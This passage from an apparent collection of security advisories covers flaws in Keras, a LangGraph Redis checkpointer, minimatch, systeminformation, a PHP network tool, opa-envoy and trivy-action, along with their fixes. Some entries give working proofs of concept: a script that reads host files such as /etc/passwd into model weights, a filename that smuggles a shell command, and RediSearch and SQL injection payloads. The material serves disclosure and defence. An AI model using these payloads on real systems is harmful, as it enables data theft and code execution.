This is primarily a configuration/visibility-scoping issue in multi-user environments where peers are not equally trusted.\n\nIn Telegram webhook mode, monitor startup also did not fall back to per-account `webhookSecret` when only the account-level secret was configured.\n\n## Typical Use Case Context\n\nMost regular OpenClaw deployments run a single agent, or run in trusted environments. In those setups, practical risk from this issue is generally low.\n\n## Impact\n\n- Shared-agent, multi-user, less-trusted environments: session-tool access could expose transcript content across peer sessions.\n- Single-agent or trusted environments: practical impact is limited.\n- Telegram webhook mode: account-level secret wiring could be missed unless an explicit monitor webhook secret override was provided.\n\n## Affected Packages / Versions\n\n- Package: npm `openclaw`\n- Affected versions: `<= 2026.2.14`\n- Patched version: `2026.2.15` (planned next release)\n\n## Remediation\n\n- Add and enforce `tools.sessions.visibility` (`self | tree | agent | all`) across session tools, defaulting to `tree`.\n- Keep sandbox clamping behavior so sandboxed runs can be restricted to spawned/session-tree visibility.\n- Resolve Telegram webhook secret from account config fallback in monitor webhook startup.\n\n## Fix Commit(s)\n\n- `c6c53437f7da033b94a01d492e904974e7bda74c`\n\nThanks @aether-ai-agent for reporting.",

          "html": "## Summary\n\nTensorFlow / Keras continues to honor HDF5 “external storage” and `ExternalLink` features when loading weights. A malicious `.weights.h5` (or a `.keras` archive embedding such weights) can direct `load_weights()` to read from an arbitrary readable filesystem path. The bytes pulled from that path populate model tensors and become observable through inference or subsequent re-save operations. Keras “safe mode” only guards object deserialization and does not cover weight I/O, so this behaviour persists even with safe mode enabled. The issue is confirmed on the latest publicly released stack (`tensorflow 2.20.0`, `keras 3.11.3`, `h5py 3.15.1`, `numpy 2.3.4`).\n\n## Impact\n\n- **Class**: CWE-200 (Exposure of Sensitive Information), CWE-73 (External Control of File Name or Path)\n- **What leaks**: Contents of any readable file on the host (e.g., `/etc/hosts`, `/etc/passwd`, `/etc/hostname`).\n- **Visibility**: Secrets appear in model outputs (e.g., Dense layer bias) or get embedded into newly saved artifacts.\n- **Prerequisites**: Victim executes `model.load_weights()` or `tf.keras.models.load_model()` on an attacker-supplied HDF5 weights file or `.keras` archive.\n- **Scope**: Applies to modern Keras (3.x) and TensorFlow 2.x lines; legacy HDF5 paths remain susceptible.\n\n## Attacker Scenario\n\n1. **Initial foothold**: The attacker convinces a user (or CI automation) to consume a weight artifact—perhaps by publishing a pre-trained model, contributing to an open-source repository, or attaching weights to a bug report.\n2. **Crafted payload**: The artifact bundles innocuous model metadata but rewrites one or more datasets to use HDF5 external storage or external links pointing at sensitive files on the victim host (e.g., `/home/<user>/.ssh/id_rsa`, `/etc/shadow` if readable, configuration files containing API keys, etc.).\n3. **Execution**: The victim calls `model.load_weights()` (or `tf.keras.models.load_model()` for `.keras` archives). HDF5 follows the external references, opens the targeted host file, and streams its bytes into the model tensors.\n4. **Exfiltration vectors**:\n   - Running inference on controlled inputs (e.g., zero vectors) yields outputs equal to the injected weights; the attacker or downstream consumer can read the leaked data.\n   - Re-saving the model (weights or `.keras` archive) persists the secret into a new artifact, which may later be shared publicly or uploaded to a model registry.\n   - If the victim pushes the re-saved artifact to source control or a package repository, the attacker retrieves the captured data without needing continued access to the victim environment.\n\n### Additional Preconditions\n\n- The target file must exist and be readable by the process running TensorFlow/Keras.\n- Safe mode (`load_model(..., safe_mode=True)`) does not mitigate the issue because the attack path is weight loading rather than object/lambda deserialization.\n- Environments with strict filesystem permissioning or sandboxing (e.g., container runtime blocking access to `/etc/hostname`) can reduce impact, but common defaults expose a broad set of host files.\n\n## Environment Used for Verification (2025‑10‑19)\n\n- OS: Debian-based container running Python 3.11.\n- Packages (installed via `python -m pip install -U ...`):\n  - `tensorflow==2.20.0`\n  - `keras==3.11.3`\n  - `h5py==3.15.1`\n  - `numpy==2.3.4`\n- Tooling: `strace` (for syscall tracing), `pip` upgraded to latest before installs.\n- Debug flags: `PYTHONFAULTHANDLER=1`, `TF_CPP_MIN_LOG_LEVEL=0` during instrumentation to capture verbose logs if needed.\n\n## Reproduction Instructions (Weights-Only PoC)\n\n1. Ensure the environment above (or equivalent) is prepared.\n2. Save the following script as `weights_external_demo.py`:\n\n```python\nfrom __future__ import annotations\nimport os\nfrom pathlib import Path\nimport numpy as np\nimport tensorflow as tf\nimport h5py\n\ndef choose_host_file() -> Path:\n    candidates = [\n        os.environ.get(\"KFLI_PATH\"),\n        \"/etc/machine-id\",\n        \"/etc/hostname\",\n        \"/proc/sys/kernel/hostname\",\n        \"/etc/passwd\",\n    ]\n    for candidate in candidates:\n        if not candidate:\n            continue\n        path = Path(candidate)\n        if path.exists() and path.is_file():\n            return path\n    raise FileNotFoundError(\"set KFLI_PATH to a readable file\")\n\ndef build_model(units: int) -> tf.keras.Model:\n    model = tf.keras.Sequential([\n        tf.keras.layers.Input(shape=(1,), name=\"input\"),\n        tf.keras.layers.Dense(units, activation=None, use_bias=True, name=\"dense\"),\n    ])\n    model(tf.zeros((1, 1)))  # build weights\n    return model\n\ndef find_bias_dataset(h5file: h5py.File) -> str:\n    matches: list[str] = []\n    def visit(name: str, obj) -> None:\n        if isinstance(obj, h5py.Dataset) and name.endswith(\"bias:0\"):\n            matches.append(name)\n    h5file.visititems(visit)\n    if not matches:\n        raise RuntimeError(\"bias dataset not found\")\n    return matches[0]\n\ndef rewrite_bias_external(path: Path, host_file: Path) -> tuple[int, int]:\n    with h5py.File(path, \"r+\") as h5file:\n        bias_path = find_bias_dataset(h5file)\n        parent = h5file[str(Path(bias_path).parent)]\n        dset_name = Path(bias_path).name\n        del parent[dset_name]\n        max_bytes = 128\n        size = host_file.stat().st_size\n        nbytes = min(size, max_bytes)\n        nbytes = (nbytes // 4) * 4 or 32  # multiple of 4 for float32 packing\n        units = max(1, nbytes // 4)\n        parent.create_dataset(\n            dset_name,\n            shape=(units,),\n            dtype=\"float32\",\n            external=[(host_file.as_posix(), 0, nbytes)],\n        )\n        return units, nbytes\n\ndef floats_to_ascii(arr: np.ndarray) -> tuple[str, str]:\n    raw = np.ascontiguousarray(arr).view(np.uint8)\n    ascii_preview = bytes(b if 32 <= b < 127 else 46 for b in raw).decode(\"ascii\", \"ignore\")\n    hex_preview = raw[:64].tobytes().hex()\n    return ascii_preview, hex_preview\n\ndef main() -> None:\n    host_file = choose_host_file()\n    model = build_model(units=32)\n\n    weights_path = Path(\"weights_demo.h5\")\n    model.save_weights(weights_path.as_posix())\n\n    units, nbytes = rewrite_bias_external(weights_path, host_file)\n    print(\"secret_text_source\", host_file)\n    print(\"units\", units, \"bytes_mapped\", nbytes)\n\n    model.load_weights(weights_path.as_posix())\n    output = model.predict(tf.zeros((1, 1)), verbose=0)[0]\n    ascii_preview, hex_preview = floats_to_ascii(output)\n    print(\"recovered_ascii\", ascii_preview)\n    print(\"recovered_hex64\", hex_preview)\n\n    saved = Path(\"weights_demo_resaved.h5\")\n    model.save_weights(saved.as_posix())\n    print(\"resaved_weights\", saved.as_posix())\n\nif __name__ == \"__main__\":\n    main()\n```\n\n3. Execute `python weights_external_demo.py`.\n4. Observe:\n   - `secret_text_source` prints the chosen host file path.\n   - `recovered_ascii`/`recovered_hex64` display the file contents recovered via model inference.\n   - A re-saved weights file contains the leaked bytes inside the artifact.\n\n## Expanded Validation (Multiple Attack Scenarios)\n\nThe following test harness generalises the attack for multiple HDF5 constructs:\n\n- Build a minimal feed-forward model and baseline weights.\n- Create three malicious variants:\n  1. **External storage dataset**: dataset references `/etc/hosts`.\n  2. **External link**: `ExternalLink` pointing at `/etc/passwd`.\n  3. **Indirect link**: external storage referencing a helper HDF5 that, in turn, refers to `/etc/hostname`.\n- Run each scenario under `strace -f -e trace=open,openat,read` while calling `model.load_weights(...)`.\n- Post-process traces and weight tensors to show the exact bytes loaded.\n\nRelevant syscall excerpts captured during the run:\n\n```\nopenat(AT_FDCWD, \"/etc/hosts\", O_RDONLY|O_CLOEXEC) = 7\nread(7, \"127.0.0.1 localhost\\n\", 64) = 21\n...\nopenat(AT_FDCWD, \"/etc/passwd\", O_RDONLY|O_CLOEXEC) = 9\nread(9, \"root:x:0:0:root:/root:/bin/bash\\n\", 64) = 32\n...\nopenat(AT_FDCWD, \"/etc/hostname\", O_RDONLY|O_CLOEXEC) = 8\nread(8, \"example-host\\n\", 64) = 13\n```\n\nThe corresponding model weight bytes (converted to ASCII) mirrored these file contents, confirming successful exfiltration in every case.\n\n## Recommended Product Fix\n\n1. **Default-deny external datasets/links**:\n   - Inspect creation property lists (`get_external_count`) before materialising tensors.\n   - Resolve `SoftLink` / `ExternalLink` targets and block if they leave the HDF5 file.\n2. **Provide an escape hatch**:\n   - Offer an explicit `allow_external_data=True` flag or environment variable for advanced users who truly rely on HDF5 external storage.\n3. **Documentation**:\n   - Update security guidance and API docs to clarify that weight loading bypasses safe mode and that external HDF5 references are rejected by default.\n4. **Regression coverage**:\n   - Add automated tests mirroring the scenarios above to ensure future refactors do not reintroduce the issue.\n\n## Workarounds\n\n- Avoid loading untrusted HDF5 weight files.\n- Pre-scan weight files using `h5py` to detect external datasets or links before invoking Keras loaders.\n- Prefer alternate formats (e.g., NumPy `.npz`) that lack external reference capabilities when exchanging weights.\n- If isolation is unavoidable, run the load inside a sandboxed environment with limited filesystem access.\n\n## Timeline (UTC)\n\n- **2025‑10‑18**: Initial proof against TensorFlow 2.12.0 confirmed local file disclosure.\n- **2025‑10‑19**: Re-validated on TensorFlow 2.20.0 / Keras 3.11.3 with syscall tracing; produced weight artifacts and JSON summaries for each malicious scenario; implemented `safe_keras_hdf5.py` prototype guard.",

The `RedisSaver` and `ShallowRedisSaver` classes construct RediSearch queries by directly interpolating user-provided filter keys and values without proper escaping. RediSearch has special syntax characters that can modify query behavior, and when user-controlled data contains these characters, the query logic can be manipulated to bypass intended access controls.\n\n## Attack surface\n\nThe core vulnerability was in the `list()` methods of both `RedisSaver` and `ShallowRedisSaver`: these methods failed to escape RediSearch special characters in filter keys and values when constructing queries. When unescaped data containing RediSearch syntax was used, the injected operators were interpreted by RediSearch rather than treated as literal search values.\n\nThis escaping bug enabled the following attack vector:\n\n- **Thread boundary escape via OR operator**: RediSearch uses `|` as an OR operator with specific precedence rules. A query like `A B | C` is interpreted as `(A AND B) OR C`. By injecting `}) | (@thread_id:{*` into a filter value, an attacker can append an OR clause that matches all threads, effectively bypassing the thread isolation constraint.\n\nThe injected query `(@thread_id:{legitimate-thread}) (@source:{x}) | (@thread_id:{*})` matches:\n\n- Documents with `thread_id:legitimate-thread AND source:x`, OR\n- Documents with ANY `thread_id`\n\nThe second clause matches all threads, bypassing thread isolation entirely.\n\n## Who is affected?\n\nApplications are vulnerable if they:\n\n- **Pass user-controlled input to filter parameters** — When using `getStateHistory()` or `checkpointer.list()` with filter values derived from user input, HTTP parameters, or other untrusted sources.\n- **Use Redis checkpointing in multi-tenant applications** — Applications that rely on thread isolation to separate data between users or tenants are at risk of cross-tenant data access.\n\nThe most common attack vector is through API endpoints that expose filtering capabilities to end users, allowing them to search or filter their conversation history.\n\n## Impact\n\nAttackers who control filter input can bypass thread isolation by injecting RediSearch OR operators to construct queries that match all threads regardless of the intended thread constraint. This enables access to checkpoint data from threads the attacker is not authorized to view.\n\nKey severity factors:\n\n- Enables complete bypass of thread-based access controls\n- Sensitive conversation data from other users may be exposed\n- Affects multi-tenant applications relying on thread isolation for data separation\n- Requires only control over filter input values (common in user-facing APIs)\n\n## Exploit example\n\n```typescript\nimport { RedisSaver } from \"@langchain/langgraph-checkpoint-redis\";\n\nconst saver = new RedisSaver({ /* redis config */ });\n\n// Normal usage - should only see thread \"user-123-thread\"\nconst legitHistory = saver.list({\n  configurable: { thread_id: \"user-123-thread\" }\n}, {\n  filter: { source: \"loop\" }\n});\n\n// Attacker crafts malicious filter value\nconst attackerFilter = {\n  source: \"x}) | (@thread_id:{*\"  // Injects OR clause matching ALL threads\n};\n\n// This produces a query like:\n// (@thread_id:{user-123-thread}) (@source:{x}) | (@thread_id:{*})\n// Due to precedence, this matches ALL threads!\n\nconst stolenHistory = saver.list({\n  configurable: { thread_id: \"user-123-thread\" }\n}, {\n  filter: attackerFilter\n});\n\n// stolenHistory now contains checkpoints from ALL threads - DATA LEAKED!\n```\n\n## Security hardening changes\n\nThe 1.0.2 patch introduces the following changes:\n\n- **Escape utility function**: A new `escapeRediSearchTagValue()` function properly escapes all RediSearch special characters (`- . < > { } [ ] \" ' : ; ! @ # $ % ^ & * ( ) + = ~ | \\ ? /`) by prefixing them with backslashes.\n- **Filter key escaping**: All filter keys are escaped before being used in query construction.\n- **Filter value escaping**: All filter values are escaped before being interpolated into RediSearch tag queries.\n\n## Migration guide\n\n### No changes needed for most users\n\nThe fix is backward compatible. Existing code will work without modifications—filter values that previously worked will continue to work, with the added protection against injection:\n\n```typescript\nimport { RedisSaver } from \"@langchain/langgraph-checkpoint-redis\";\n\n// Works exactly as before, now with injection protection\nconst history = saver.list(config, {\n  filter: { source: \"loop\" }\n});\n```\n\n### If you were relying on special characters\n\nIf your application intentionally used RediSearch syntax in filter values (unlikely but possible), be aware that these characters will now be escaped and treated as literals.\n\n### For applications with user-facing filters\n\nNo code changes required, but this is a good time to review your API design:\n\n```typescript\n// Before: Vulnerable to injection\napp.get(\"/history\", async (req, res) => {\n  const history = await saver.list(config, {\n    filter: req.query.filter  // User-controlled - was vulnerable\n  });\n});\n\n// After: Now safe, but consider validating allowed filter keys\napp.get(\"/history\", async (req, res) => {\n  const allowedKeys = [\"source\", \"step\"];\n  const sanitizedFilter = Object.fromEntries(\n    Object.entries(req.query.filter || {})\n      .filter(([key]) => allowedKeys.includes(key))\n  );\n  const history = await saver.list(config, {\n    filter: sanitizedFilter\n  });\n});\n```\n\n> **Recommendation**: Even with the fix in place, consider validating that filter keys are from an allowed list as a defense-in-depth measure.\n\n## References\n\n- [RediSearch Query Syntax](https://redis.io/docs/interact/search-and-query/query/)\n- [LangGraph Checkpoint Documentation](https://langchain-ai.github.io/langgraphjs/)",

Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.\n\nThe time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.\n\n\n### Details\n_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\n\n### PoC\nWhen minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`:\n\n```\n/^(?!\\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/\n```\n\nWhen the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential.\n### Impact\nAny application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:\n- File search/filter UIs that accept glob patterns\n- `.gitignore`-style filtering with user-defined rules\n- Build tools that accept glob configuration\n- Any API that exposes glob matching to untrusted input",

          "html": "# Command Injection via Unsanitized `locate` Output in `versions()` — systeminformation\n\n**Package:** systeminformation (npm)  \n**Tested Version:** 5.30.7  \n**Affected Platform:** Linux  \n**Author:** Sebastian Hildebrandt  \n**Weekly Downloads:** ~5,000,000+  \n**Repository:** https://github.com/sebhildebrandt/systeminformation  \n**Severity:** Medium  \n**CWE:** CWE-78 (OS Command Injection)  \n\n---\n\n### The Vulnerable Code Path\n\nInside the `versions()` function, when detecting the PostgreSQL version on Linux, the code does this:\n\n```javascript\n// lib/osinfo.js — lines 770-776\n\nexec('locate bin/postgres', (error, stdout) => {\n  if (!error) {\n    const postgresqlBin = stdout.toString().split('\\n').sort();\n    if (postgresqlBin.length) {\n      exec(postgresqlBin[postgresqlBin.length - 1] + ' -V', (error, stdout) => {\n        // parses version string...\n      });\n    }\n  }\n});\n```\n\nHere's what happens step by step:\n\n1. It runs `locate bin/postgres` to search the filesystem for PostgreSQL binaries\n2. It splits the output by newline and sorts the results alphabetically\n3. It takes the **last element** (highest alphabetically)\n4. It concatenates that path directly into a new `exec()` call with `+ ' -V'`\n\n**No `sanitizeShellString()`. No path validation. No `execFile()`. Raw string concatenation into `exec()`.**\n\nThe `locate` command reads from a system-wide database (`plocate.db` or `mlocate.db`) that indexes all filenames on the system. If any indexed filename contains shell metacharacters — specifically semicolons — those characters will be interpreted by the shell when passed to `exec()`.\n\n---\n\n## Exploitation\n\n### Prerequisites\n\nFor this vulnerability to be exploitable, the following conditions must be met:\n\n1. **Target system runs Linux** — the vulnerable code path is inside an `if (_linux)` block\n2. **`locate` / `plocate` is installed** — common on Ubuntu, Debian, Fedora, RHEL\n3. **PostgreSQL binary exists in the locate database** — so `locate bin/postgres` returns results (otherwise the code falls through to a safe `psql -V` fallback)\n4. **The attacker can create files on the filesystem** — in any directory that gets indexed by `updatedb`\n5. **The locate database gets updated** — `updatedb` runs daily via systemd timer (`plocate-updatedb.timer`) or cron on most distros\n\n### Step 1 — Verify the Environment\n\nOn the target machine, confirm locate is available and running:\n\n```\nwhich locate\n# /usr/bin/locate\n\nsystemctl list-timers | grep plocate\n# plocate-updatedb.timer    plocate-updatedb.service\n# (runs daily, typically around 1-2 AM)\n```\n\nCheck who owns the locate database:\n\n```\nls -la /var/lib/plocate/plocate.db\n# -rw-r----- 1 root plocate 18851616 Feb 14 01:50 /var/lib/plocate/plocate.db\n```\n\nDatabase is root-owned and updated by root. Regular users cannot update it directly, but `updatedb` runs on a daily schedule and indexes all readable files.\n\n### Step 2 — Craft the Malicious File Path\n\nThe key insight is that **Linux allows semicolons in filenames**, and `exec()` passes strings through `/bin/sh -c` which **interprets semicolons as command separators**.\n\nCreate a file whose path contains an injected command:\n\n```\nmkdir -p \"/var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin\"\ntouch \"/var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres\"\n```\n\nVerify it exists:\n\n```\nfind /var/tmp -name postgres\n# /var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres\n```\n\nThis file needs to end up in the `locate` database. On a real system, this happens automatically when `updatedb` runs overnight. For testing purposes:\n\n```\nsudo updatedb\n```\n\nThen verify locate picks it up:\n\n```\nlocate bin/postgres\n# /usr/lib/postgresql/14/bin/postgres\n# /var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres\n```\n\n### Step 3 — Understand the Sort Trick\n\nThe vulnerable code sorts the locate results alphabetically and takes the **last** element:\n\n```javascript\nconst postgresqlBin = stdout.toString().split('\\n').sort();\nexec(postgresqlBin[postgresqlBin.length - 1] + ' -V', ...);\n```\n\nAlphabetically, `/var/` sorts **after** `/usr/`. So our malicious path naturally becomes the selected one:\n\n```\nNode.js sort order:\n  [0] /usr/lib/postgresql/14/bin/postgres   ← legitimate\n  [1] /var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres   ← selected (last)\n```\n\nQuick verification:\n\n```\nnode -e \"\nconst paths = [\n  '/usr/lib/postgresql/14/bin/postgres',\n  '/var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres'\n];\nconsole.log('Sorted:', paths.sort());\nconsole.log('Selected (last):', paths[paths.length - 1]);\n\"\n```\n\nOutput:\n\n```\nSorted: [\n  '/usr/lib/postgresql/14/bin/postgres',\n  '/var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres'\n]\nSelected (last): /var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres\n```\n\n### Step 4 — Trigger the Vulnerability\n\nNow when any application using systeminformation calls `versions()` requesting the postgresql version, the injected command fires:\n\n```javascript\nconst si = require('systeminformation');\n\n// This is a normal, innocent API call\nsi.versions('postgresql').then(data => {\n  console.log(data);\n});\n```\n\nInternally, the library builds and executes this command:\n\n```\n/var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres -V\n```\n\nThe shell (`/bin/sh -c`) interprets this as three separate commands:\n\n```\n/var/tmp/x                         →  fails silently (not executable)\ntouch /tmp/SI_RCE_PROOF            →  ATTACKER'S COMMAND EXECUTES\n/bin/postgres -V                   →  runs normally, returns version\n```\n\n### Step 5 — Verify Code Execution\n\n```\nls -la /tmp/SI_RCE_PROOF\n# -rw-rw-r-- 1 appuser appuser 0 Feb 14 15:30 /tmp/SI_RCE_PROOF\n```\n\nThe file exists. Arbitrary command execution confirmed.\n\nThe injected command runs with **whatever privileges the Node.js process has**. In a monitoring dashboard or backend API context, that's typically the application service account.\n\n---\n\n## Real-World Attack Scenarios\n\n### Scenario 1 — Shared Hosting / Multi-Tenant Server\n\nA low-privileged user on a shared server creates the malicious file in `/tmp` or their home directory. The hosting provider runs a monitoring agent that uses `systeminformation` for health dashboards. Next time the agent calls `versions()`, the attacker's command executes under the monitoring agent's (higher-privileged) service account.\n\n### Scenario 2 — CI/CD Pipeline Poisoning\n\nA malicious contributor submits a PR that includes a build step creating files with crafted names. If the CI pipeline uses `systeminformation` for environment reporting (common in test harnesses and build dashboards), the injected commands execute in the CI runner context — potentially leaking secrets, tokens, and deployment keys.\n\n### Scenario 3 — Container / Kubernetes Escape\n\nIn containerized environments where `/var` or `/tmp` sits on a shared volume, a compromised container creates the malicious file. When the host-level monitoring agent (running `systeminformation`) calls `versions()`, the injected command executes on the host, breaking out of the container boundary.\n\n---\n\n## Suggested Fix\n\nReplace `exec()` with `execFile()` for the PostgreSQL binary version check. `execFile()` does not spawn a shell, so metacharacters in the path are treated as literal characters:\n\n```javascript\nconst { execFile } = require('child_process');\n\nexec('locate bin/postgres', (error, stdout) => {\n  if (!error) {\n    const postgresqlBin = stdout.toString().split('\\n')\n      .filter(p => p.trim().length > 0)\n      .sort();\n    if (postgresqlBin.length) {\n      execFile(postgresqlBin[postgresqlBin.length - 1], ['-V'], (error, stdout) => {\n        // ... parse version\n      });\n    }\n  }\n});\n```\n\nAdditionally, the locate output should be validated against a safe path pattern before use:\n\n```javascript\nconst safePath = /^[a-zA-Z0-9/_.-]+$/;\nconst postgresqlBin = stdout.toString().split('\\n')\n  .filter(p => safePath.test(p.trim()))\n  .sort();\n```\n\n---\n\n## Disclosure\n\n- **Reported via:** GitHub Private Security Advisory\n- **Advisory URL:** https://github.com/sebhildebrandt/systeminformation/security/advisories/new\n- **Security Contact:** security@systeminformation.io",

The application fails to properly sanitize or parameterize user input when processing IPv6 address searches. Specifically, the `address` parameter is split into an address and a prefix, and the prefix portion is directly concatenated into the SQL query string without validation. This allows an attacker to inject arbitrary SQL commands, potentially leading to unauthorized data access or database manipulation.\n\n### Details\nThe vulnerability is located in the logic that handles address searching when `search_type` is set to `ipv6`.\n\nThe application takes the user-supplied `address` parameter and splits it using the `/` delimiter:\n```PHP\n[$address, $prefix] = explode('/', $vars['address']);\n```\nIf the search_type is ipv6 and the $prefix variable is not empty, the code constructs the SQL query by directly concatenating the $prefix variable into the string:\n```\n} elseif ($vars['search_type'] == 'ipv6') {\n    // ... code omitted ...\n    if (! empty($prefix)) {\n        // VULNERABILITY: Direct concatenation of user input\n        $sql .= \" AND ipv6_prefixlen = '$prefix'\";\n    }\n}\n```\nUnlike the ipv4 block, which attempts to use prepared statements (binding parameters via $param[]), the ipv6 block treats the prefix as a raw string. By supplying an input containing a /, an attacker can populate the $prefix variable. If this variable contains single quotes ('), it breaks out of the string literal in the SQL statement, enabling SQL injection.\n\nVulnerable Code Snippet:\n```\nif (! empty($prefix)) {\n    $sql .= \" AND ipv6_prefixlen = '$prefix'\";\n}\n```\n### PoC\nTo reproduce this vulnerability, an attacker can send a specially crafted HTTP POST request to the ajax_table.php endpoint.\n\nPayload breakdown:\n\n- search_type=ipv6: Forces the execution flow into the vulnerable elseif block.\n\n- address=snow/1nd'\":\n\n  - The explode function splits this into $address = 'snow' and $prefix = \"1nd'\"\".\n\n  - The SQL query becomes: ... AND ipv6_prefixlen = '1nd'\"'.\n\n  - The single quote ' closes the string definition in the SQL query, and the subsequent characters allow for SQL syntax manipulation.\n\nReproduction Steps:\n\n1. Access the application instance.\n\n2. Send the following request (adjusting the host as necessary):\n```\nPOST /ajax_table.php HTTP/1.1\nHost: localhost\nid=address-search&search_type=ipv6&address=snow/1nd'\" \n```\n### Impact\nThis vulnerability allows an attacker to execute arbitrary SQL queries against the database.",

This incorrect return value may allow downstream libraries to accept invalid or incomplete canonicalized XML, which has been demonstrated to enable signature validation bypass in SAML libraries.\n\nJRuby is not affected, as the Java implementation correctly raises `RuntimeError` on canonicalization failure.\n\n## Mitigation\n\nUpgrade to Nokogiri `>= 1.19.1`.\n\n## Severity\n\nThe maintainers have assessed this as **Medium** severity. Nokogiri itself is a parsing library without a clear security boundary related to canonicalization, so the direct impact is that a method returns incorrect data on invalid input. However, this behavior was exploited in practice to bypass SAML signature validation in downstream libraries (see References).\n\n## Credit\n\nThis vulnerability was responsibly reported by HackerOne researcher `d4d`.",

Node.js automatically imports `**/*.plugin.{js,mjs}` files including those from `node_modules`, so any malicious package with a `.plugin.js` file could execute arbitrary code when installed or required. **All projects using this loading behavior are affected**, especially those installing untrusted packages.\n\n### Patches\nThe issue has been **patched in v0.0.5**. Users should upgrade to **v0.0.5 or later** to mitigate the vulnerability.\n\n### Workarounds\n- Audit and restrict which packages are installed in `node_modules`.\n\n### References\n- [CWE-94: Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)  \n- GitHub Security Advisories documentation: [https://docs.github.com/en/code-security/security-advisories](https://docs.github.com/en/code-security/security-advisories)",

HTTP request paths are treated as full URIs when parsed; interpreting leading path segments prefixed with double slashes (`//`) as [authority](https://datatracker.ietf.org/doc/html/rfc3986#section-3.2) components, and therefore dropping them from the parsed path. This creates a path interpretation mismatch between authorization policies and backend servers, enabling attackers to bypass access controls by crafting requests where the authorization filter evaluates a different path than the one ultimately served.\n\n#### Attack example\n\n**HTTP request:**\n\n```\nGET //admin/users HTTP/1.1\nHost: example.com\n```\n\n**Policy sees:**\n\nThe leading `//admin` path segment is interpreted as an authority component, and dropped from `input.parsed_path` field:\n\n\n```json\n{\n  \"parsed_path\": [\"users\"]\n}\n```\n\n**Backend receives:**\n\n`//admin/users` path, normalized to `/admin/users`.\n\n#### Affected Request Pattern Examples\n\n| Request path | `input.parsed_path` | `input.attributes.request.http.path` | Discrepancy |\n| - | - | - | - |\n| / | [\"\"] | / | ✅ None |\n| //foo  | [\"\"] | //foo| ❌ Mismatch |\n| /admin | [\"admin\"] | /admin | ✅ None |\n| /admin/users | [\"admin\", \"users\"] |  /admin/users | ✅ None |\n| //admin/users  | [\"users\"] | //admin/users | ❌ Mismatch |\n\n### Impact\n\nUsers are impacted if all the following conditions apply:\n\n1. Protected resources are path-hierarchical (e.g., `/admin/users` vs `/users`)\n2. Authorization policies use `input.parsed_path` for path-based decisions\n3. Backend servers apply lenient path normalization\n\n### Patches\n\nGo: `v1.13.2-envoy-2`\nDocker: `1.13.2-envoy-2`, `1.13.2-envoy-2-static`\n\n### Workarounds\n\nUsers who cannot immediately upgrade opa-envoy-plugin are recommended to apply one, or more, of the workarrounds described below.\n\n#### 1. Enable the `merge_slashes` Envoy configuration option\n\nAs per [Envoy best practices](https://www.envoyproxy.io/docs/envoy/v1.37.0/configuration/best_practices/edge.html), enabling the [merge_slashes](https://www.envoyproxy.io/docs/envoy/latest/api-v3/extensions/filters/network/http_connection_manager/v3/http_connection_manager.proto#envoy-v3-api-field-extensions-filters-network-http-connection-manager-v3-httpconnectionmanager-merge-slashes) configuration option in Envoy will remove redundant slashes from the request path before filtering is applied, effectively mitigating the `input.parsed_path` issue described in this advisory.\n\n\n#### 2. Use `input.attributes.request.http.path` instead of `input.parsed_path` in policies\n\nThe `input.attributes.request.http.path` field contains the unprocessed, raw request path. Users are recommended to update any policy using `input.parsed_path` to instead use the `input.attributes.request.http.path` field.\n\n##### Example ####\n\n```rego\npackage example\n\n# Use instead of input.parsed_path\nparsed_path := split(                                        # tokenize into array\n\ttrim_left(                                               # drop leading slashes\n\t\turlquery.decode(input.attributes.request.http.path), # url-decode the path\n\t\t\"/\",\n\t),\n\t\"/\",\n)\n```",

The action writes `export VAR=<input>` lines to `trivy_envs.txt` based on user-supplied inputs and subsequently sources this file in `entrypoint.sh`.\n\nBecause input values are written without appropriate shell escaping, attacker-controlled input containing shell metacharacters (e.g., `$(...)`, backticks, or other command substitution syntax) may be evaluated during the sourcing process. This can result in arbitrary command execution within the GitHub Actions runner context.\n\n**Severity:**\n\nModerate\n\nCVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N\n\nCWE-78: Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)\n\n**Impact:**\n\nSuccessful exploitation may lead to arbitrary command execution in the CI runner environment.\n\n\n**Affected Versions:**\n\n* Versions >= 0.31.0 and <= 0.33.1\n* Introduced in commit `7aca5ac`\n\n**Affected Conditions:**\n\nThe vulnerability is exploitable when a consuming workflow passes attacker-controlled data into any action input that is written to `trivy_envs.txt`. Access to user input is required by the malicious actor.\n\nA representative exploitation pattern involves incorporating untrusted pull request metadata into an action parameter. For example:\n\n```yaml\n- uses: aquasecurity/trivy-action@0.33.1\n  with:\n    output: \"trivy-${{ github.event.pull_request.title }}.sarif\"\n```\n\nIf the pull request title contains shell syntax, it may be executed when the generated environment file is sourced.\n\n**Not Affected:**\n\n* Workflows that do not pass attacker-controlled data into `trivy-action` inputs\n* Workflows that upgrade to a patched version that properly escapes shell values or eliminates the `source ./trivy_envs.txt` pattern\n* Workflows where user input is not accessible.\n\n**Call Sites:**\n\n* `action.yaml:188` — `set_env_var_if_provided` writes unescaped `export` lines\n* `entrypoint.sh:9` — sources `./trivy_envs.txt`",

